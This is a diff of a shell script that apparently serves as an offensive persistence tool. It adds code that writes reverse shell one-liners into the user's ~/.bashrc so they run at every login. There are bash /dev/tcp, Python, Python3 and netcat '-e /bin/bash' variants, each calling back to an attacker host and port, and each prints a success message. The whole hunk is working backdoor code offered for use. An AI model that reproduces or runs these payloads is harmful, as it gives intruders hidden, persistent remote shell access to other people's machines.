@@ -82,14 +82,25 @@ fi
 
 if [ "$home" == "yes" ];
 then
-	if [ "$nc" == "yes" ];
+	if [ "$bash" == "yes" ];
 	then
-		touch ~/.bashrc
-		echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
+		echo "bash -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1' 2> /dev/null & sleep .0001" >> ~/.bashrc
+		echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in $(whoami)'s bashrc"
 	fi
 	if [ "$python" == "yes" ];
 	then
 		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
+		echo -e "\e[92m[+]\e[0m Python reverse shell loaded in $(whoami)'s bashrc"
+	fi
+	if [ "$python3" == "yes" ];
+	then
+		echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
+		echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in $(whoami)'s bashrc"
+	fi
+	if [ "$nc" == "yes" ];
+	then
+		echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
+		echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in $(whoami)'s bashrc"
 	fi
 fi
 
